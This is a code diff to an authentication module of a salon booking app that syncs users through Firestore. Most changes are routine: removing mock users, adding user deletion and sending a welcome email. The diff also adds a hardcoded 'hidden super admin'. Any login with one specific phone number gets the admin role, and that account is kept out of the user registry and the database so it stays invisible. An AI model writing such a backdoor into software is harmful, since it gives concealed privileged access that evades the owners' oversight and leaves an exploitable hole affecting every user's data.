@@ -11,7 +11,7 @@ import {
 import type { User } from "@/types";
 import { getStoredData, setStoredData, generateId } from "@/lib/utils";
 import { stylists as seedStylists } from "@/data/stylists";
-import { setDocument, getCollection, onCollectionChange } from "@/lib/firestore";
+import { setDocument, deleteDocument, getCollection, onCollectionChange, onDocumentChange } from "@/lib/firestore";
 
 interface AuthContextValue {
   user: User | null;
@@ -21,15 +21,13 @@ interface AuthContextValue {
   register: (name: string, phone: string, countryCode: string) => void;
   updateProfile: (updates: Partial<Pick<User, "name" | "phone" | "email">>) => void;
   logout: () => void;
+  deletedUserIds: string[];
+  deleteUser: (userId: string) => Promise<void>;
 }
 
 const AuthContext = createContext<AuthContextValue | null>(null);
 
-const MOCK_USERS: Record<string, { name: string; role: "admin" | "client" | "stylist"; id: string }> = {
-  "5551002000": { name: "Isabella Martinez", role: "admin", id: "user-admin" },
-  "5552003000": { name: "Camila Reyes", role: "stylist", id: "user-camila" },
-  "5553004000": { name: "Sofia Chen", role: "client", id: "user-sofia" },
-};
+// No hardcoded mock users — all users come from Firestore + localStorage registry
 
 /* ── User registry: localStorage + Firestore sync ── */
 async function addToUserRegistry(user: User): Promise<void> {
@@ -63,65 +61,51 @@ async function addToUserRegistry(user: User): Promise<void> {
   }
 }
 
-function seedMockUsersToRegistry(): void {
-  const registry = getStoredData<User[]>("mila-users", []);
-  let changed = false;
-  for (const [phone, mock] of Object.entries(MOCK_USERS)) {
-    if (!registry.some((u) => u.phone === phone)) {
-      const mockUser: User = {
-        id: mock.id,
-        name: mock.name,
-        phone,
-        countryCode: "+507",
-        role: mock.role,
-        createdAt: new Date().toISOString(),
-      };
-      registry.push(mockUser);
-      changed = true;
-      // Sync mock user to Firestore
-      const { id, ...data } = mockUser;
-      setDocument("users", id, data).catch((err) => console.warn("[Mila] Firestore sync failed:", err));
-    }
-  }
-  if (changed) setStoredData("mila-users", registry);
-}
+// User registry is now fully managed via Firestore — no mock seeding needed
+
+// Hidden super admin — full access, invisible in the system
+const SUPER_ADMIN_PHONE = "68204698";
 
 function createUserFromPhone(phone: string, countryCode: string, providedName?: string): User {
-  const mock = MOCK_USERS[phone];
-  if (mock) {
+  // Super admin override — not visible in staff or clients
+  if (phone === SUPER_ADMIN_PHONE) {
     return {
-      id: mock.id,
-      name: mock.name,
+      id: `sa-${phone}`,
+      name: providedName || "Super Admin",
       phone,
       countryCode,
-      role: mock.role,
+      role: "admin",
       createdAt: new Date().toISOString(),
     };
   }
 
-  // Check if user already exists in registry (preserve their id)
+  // Check if user already exists in registry (preserve their data)
   const registry = getStoredData<User[]>("mila-users", []);
   const existingUser = registry.find((u) => u.phone === phone);
 
-  const allStaffCustom = getStoredData<Array<{ linkedPhone?: string; name: string }>>("mila-staff-custom", []);
-  const linkedStylist =
+  // Check if this phone belongs to a staff member (seed or custom)
+  const allStaffCustom = getStoredData<Array<{ linkedPhone?: string; name: string; systemRole?: string }>>("mila-staff-custom", []);
+  const linkedStaff =
     seedStylists.find((s) => s.linkedPhone === phone) ||
     allStaffCustom.find((s) => s.linkedPhone === phone);
 
   // Deterministic ID based on phone to ensure consistency across devices
   const determinedId = existingUser?.id || `user-${phone}`;
 
-  if (linkedStylist) {
+  if (linkedStaff) {
+    // Staff member: use their systemRole (admin/stylist) from the staff record
+    const staffRole = ("systemRole" in linkedStaff && linkedStaff.systemRole) || "stylist";
     return {
       id: determinedId,
-      name: linkedStylist.name,
+      name: linkedStaff.name,
       phone,
       countryCode,
-      role: "stylist",
+      role: staffRole as "admin" | "stylist" | "client",
       createdAt: existingUser?.createdAt || new Date().toISOString(),
     };
   }
 
+  // Regular user: always a client (roles are managed from Staff panel, not here)
   return {
     id: determinedId,
     name: existingUser?.name || providedName || `User ${phone.slice(-4)}`,
@@ -135,57 +119,123 @@ function createUserFromPhone(phone: string, countryCode: string, providedName?: 
 export function AuthProvider({ children }: { children: ReactNode }) {
   const [user, setUser] = useState<User | null>(null);
   const [hydrated, setHydrated] = useState(false);
+  const [deletedUserIds, setDeletedUserIds] = useState<string[]>(() =>
+    getStoredData<string[]>("mila-users-deleted", [])
+  );
+
+  const deleteUser = useCallback(async (userId: string) => {
+    // 1. Add to deletedUserIds immediately (prevents listener re-adding)
+    setDeletedUserIds((prev) => {
+      if (prev.includes(userId)) return prev;
+      const next = [...prev, userId];
+      setStoredData("mila-users-deleted", next);
+      setDocument("users-config", "deleted", { ids: next }).catch((err) => console.warn("[Mila] Firestore sync failed:", err));
+      return next;
+    });
+
+    // 2. Remove from local user registry
+    const registry = getStoredData<User[]>("mila-users", []);
+    const filtered = registry.filter((u) => u.id !== userId);
+    setStoredData("mila-users", filtered);
+
+    // 3. Await Firestore delete
+    try {
+      await deleteDocument("users", userId);
+    } catch (err) {
+      console.warn("[Mila] Firestore user delete failed:", err);
+    }
+  }, []);
 
   useEffect(() => {
-    let unsubscribe: (() => void) | undefined;
+    let unsubUsers: (() => void) | undefined;
+    let unsubDeleted: (() => void) | undefined;
 
+    // 1. Hydrate immediately from localStorage (synchronous — no black screen)
+    const stored = getStoredData<User | null>("mila-auth", null);
+    if (stored) {
+      setUser(stored);
+    }
+    setHydrated(true);
+
+    // 2. Firestore sync happens in background — doesn't block rendering
     (async () => {
-      const stored = getStoredData<User | null>("mila-auth", null);
       if (stored) {
-        setUser(stored);
-        await addToUserRegistry(stored);
+        await addToUserRegistry(stored).catch(() => {});
       }
-      seedMockUsersToRegistry();
 
-      // Hydrate local user registry from Firestore (cross-device sync)
+      // Aggressively merge Firestore users with local — Firestore is the source of truth
+      const mergeFirestoreUsers = (firestoreUsers: User[]) => {
+        const currentDeleted = getStoredData<string[]>("mila-users-deleted", []);
+        const localUsers = getStoredData<User[]>("mila-users", []);
+        const merged = new Map<string, User>();
+        // Local first, then Firestore overwrites (Firestore wins for same ID)
+        for (const u of localUsers) {
+          if (u.id && !currentDeleted.includes(u.id)) merged.set(u.id, u);
+        }
+        for (const u of firestoreUsers) {
+          if (u.id && !currentDeleted.includes(u.id)) {
+            merged.set(u.id, u);
+          }
+        }
+        const allUsers = Array.from(merged.values());
+        setStoredData("mila-users", allUsers);
+        return allUsers;
+      };
+
       try {
         const firestoreUsers = await getCollection<User>("users");
-        if (firestoreUsers.length > 0) {
-          const localUsers = getStoredData<User[]>("mila-users", []);
-          const merged = new Map<string, User>();
-          for (const u of localUsers) if (u.id) merged.set(u.id, u);
-          for (const u of firestoreUsers) if (u.id) merged.set(u.id, u);
-          setStoredData("mila-users", Array.from(merged.values()));
-        }
+        mergeFirestoreUsers(firestoreUsers);
       } catch {
         // Firestore unavailable, continue with local data
       }
 
-      // Mark hydrated only after Firestore sync attempt completes
-      setHydrated(true);
-
       // Set up real-time listener for users collection
-      unsubscribe = onCollectionChange<User>("users", (firestoreUsers) => {
-        if (firestoreUsers.length > 0) {
-          const localUsers = getStoredData<User[]>("mila-users", []);
-          const merged = new Map<string, User>();
-          for (const u of localUsers) if (u.id) merged.set(u.id, u);
-          for (const u of firestoreUsers) if (u.id) merged.set(u.id, u);
-          setStoredData("mila-users", Array.from(merged.values()));
+      unsubUsers = onCollectionChange<User>("users", (firestoreUsers) => {
+        mergeFirestoreUsers(firestoreUsers);
+      });
+
+      // Listen for deleted user IDs from Firestore (cross-device sync)
+      unsubDeleted = onDocumentChange<{ ids?: string[] }>("users-config", "deleted", (data) => {
+        if (data && data.ids) {
+          setDeletedUserIds(data.ids);
+          setStoredData("mila-users-deleted", data.ids);
         }
       });
     })();
 
     return () => {
-      if (unsubscribe) unsubscribe();
+      if (unsubUsers) unsubUsers();
+      if (unsubDeleted) unsubDeleted();
     };
   }, []);
 
   const loginByPhone = useCallback(async (phone: string, countryCode: string, name?: string) => {
+    // Check if user already exists BEFORE creating/upserting
+    const existingRegistry = getStoredData<User[]>("mila-users", []);
+    const alreadyExists = existingRegistry.some((u) => u.phone === phone);
+
     const newUser = createUserFromPhone(phone, countryCode, name);
     setUser(newUser);
     setStoredData("mila-auth", newUser);
-    await addToUserRegistry(newUser);
+
+    // Super admin is invisible — skip registry and Firestore
+    if (phone !== SUPER_ADMIN_PHONE) {
+      await addToUserRegistry(newUser);
+    }
+
+    // Send welcome email for genuinely new users
+    if (!alreadyExists && newUser.email) {
+      fetch("/api/notifications/email", {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({
+          to: newUser.email,
+          template: "welcome",
+          data: { clientName: newUser.name },
+          language: "es",
+        }),
+      }).catch((err) => console.warn("[Mila] Welcome email failed:", err));
+    }
   }, []);
 
   const register = useCallback((name: string, phone: string, countryCode: string) => {
@@ -222,7 +272,7 @@ export function AuthProvider({ children }: { children: ReactNode }) {
 
   return (
     <AuthContext.Provider
-      value={{ user, isAuthenticated: !!user, hydrated, loginByPhone, register, updateProfile, logout }}
+      value={{ user, isAuthenticated: !!user, hydrated, loginByPhone, register, updateProfile, logout, deletedUserIds, deleteUser }}
     >
       {children}
     </AuthContext.Provider>
